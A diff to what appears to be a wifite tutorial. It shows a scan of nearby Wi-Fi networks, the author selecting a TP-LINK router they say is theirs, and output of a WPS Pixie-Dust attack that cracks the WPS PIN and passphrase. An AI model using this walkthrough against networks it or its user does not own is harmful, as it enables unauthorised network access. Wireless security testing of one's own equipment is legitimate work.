@@ -110,10 +110,12 @@ sudo wifite --kill
    ---  -------------------------  ---  -----   ----   ---  ------
      1            Telekom-******     6  WPA-P   74db  lock    1                                                                                                                                                                             
      2              TP-LINK_055A    11  WPA-P   63db   yes    6                                                                                                                                                                             
-And a lot of others...But this 2 is mine, so...
+
+And a lot of others...But this first 2 is mine, so...
 press ctrl+c:
  [+] Select target(s) (1-10) separated by commas, dashes or all: 
 Lets select the desired wifi: 2
+
 [+] (1/1) Starting attacks against: **:**:**:**:**:** (TP-LINK_055A)
  [+] TP-LINK_055A (65db) WPS Pixie-Dust: [4m57s] Cracked WPS PIN: 38643248                                                                                                                                                                  
  [+] TP-LINK_055A (65db) WPS Pixie-Dust: [4m55s] Cracked WPS PSK: 38643248                                                                                                                                                                  
